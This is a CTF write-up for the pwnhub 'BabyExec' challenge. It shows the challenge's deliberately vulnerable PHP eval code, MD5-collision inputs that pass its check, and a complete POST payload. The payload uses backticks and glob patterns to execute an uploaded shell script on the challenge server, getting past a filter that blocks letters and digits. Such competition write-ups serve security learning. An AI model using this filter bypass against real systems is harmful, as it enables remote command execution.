---
title: "pwnhub: [Mid-Autumn Festival] BabyExec writeup"
slug: dfc5eu
translationKey: dfc5eu
date: 2021-09-17T14:13:44+08:00
source: yuque/penetration
---

My first submission to pwnhub — I hope to join this excellent community of ours!

# 1. Prologue: A True MD5 Collision

The challenge:

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if ((string)$_GET['x'] !== (string)$_GET['y'] && md5($_GET['x']) === md5($_GET['y'])) {
    if(!isset($_GET['shell'])){
        echo "Attack me!";
    } else {
        $shell = $_GET['shell'];
        if(!preg_match("/[a-zA-Z0-9_$@]+/",$shell)){
            eval($shell);
        } else {
            die('No,No,No! Keep it up......'); 
        }
    }
} else {
    die("No, way!");
}

?>
```

The MD5 check:

Without relying on weak typing, make md5(x) and md5(y) equal while x and y differ — a classic, well-worn topic.

Searching Bing for [`md5 collision -"弱类型"`] (i.e., excluding "weak typing") turned up this page: [MD5 Collision Demo](https://www.mscs.dal.ca/~selinger/md5collision/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860140485-67131604-11ae-46cf-ba79-8e8090220296.png)

A quick hex2bin and urlencode to fix up the format:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860197554-41778c37-a70d-4eba-af61-feffeb2ffac6.png)

```php
http://121.40.89.206:8100/?&x=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
&
y=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
```

The first condition is satisfied; on to the second bypass.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631860255532-54bb0e85-ea2c-4926-bb8b-516ce46238bc.png)



# 2. Breakthrough: glob Expressions

## (1) Code execution?

eval gives code execution, but the regex restricts the character set. In essence, it boils down to this:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859363498-b5c0156b-b406-437d-96ab-63349a48bb1c.png)

See: [https://regex101.com/r/oIJbxL/1](https://regex101.com/r/oIJbxL/1)



An alphanumeric-free webshell — a classic topic! But this scenario differs slightly, with two key points:

1. Backticks are allowed
2. `$` is not allowed

So although techniques like (negation / XOR / string concatenation / character increment) are still usable — e.g. `''.[] = 'Array'` — any arbitrary string can be constructed.

But without `$`, how do you call a function? (Note the challenge runs PHP 5, so the `($function)()` calling style is unavailable.)

So I dug into more references, and during my lunch break I found the article "[SCU-CTF HomePage — Command Execution: Recommended Good Reads ¶](https://www.scuctf.com/ctfwiki/web/3.rce/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/)" (y4 yyds), which is how I cracked this challenge.

## (2) Command execution!

After reading phithon's article "[Advanced Webshells Without Letters or Numbers | leavesongs](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)", I identified the main difference from the article: `@` is filtered here, so another approach is needed.

To follow along precisely, I set up a local test environment:

```php
# Simulate a /tmp/phpSessoo
touch /tmp/phpSessoo
```

Actually, checking the ASCII table, you can just swap @ for a nearby character (it only needs to come before A):

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859928633-6a3f5736-021d-46c1-9b26-77ad4e58e173.png)

I went with the question mark: `?` — and the match succeeds:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859915626-a1f6ee6e-6dc2-48dd-8953-c34fb1481afe.png)

The final payload:

```php
POST /?shell=?><?=`.+/???/???[?-[]?????`;?>&x=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap&y=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap HTTP/1.1
Host: 121.40.89.206:8100
Content-Length: 189
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeU7iiC6HdkUDXKn1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryeU7iiC6HdkUDXKn1
Content-Disposition: form-data; name="file"; filename="1.txt"

#!/bin/sh

ls / && cat /flag && id
------WebKitFormBoundaryeU7iiC6HdkUDXKn1--

```



bingo

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631859253286-0a30a78d-eeee-4915-9cdc-5467c544b90e.png)



# References
+ [Advanced Webshells Without Letters or Numbers | leavesongs](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
+ [https://man7.org/linux/man-pages/man7/glob.7.html](https://man7.org/linux/man-pages/man7/glob.7.html)
+ [SCU-CTF HomePage — Command Execution: Recommended Good Reads ¶](https://www.scuctf.com/ctfwiki/web/3.rce/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/)
+ [https://regex101.com/r/oIJbxL/1/](https://regex101.com/r/oIJbxL/1/)
+ [https://tool.ip138.com/ascii_code/](https://tool.ip138.com/ascii_code/)
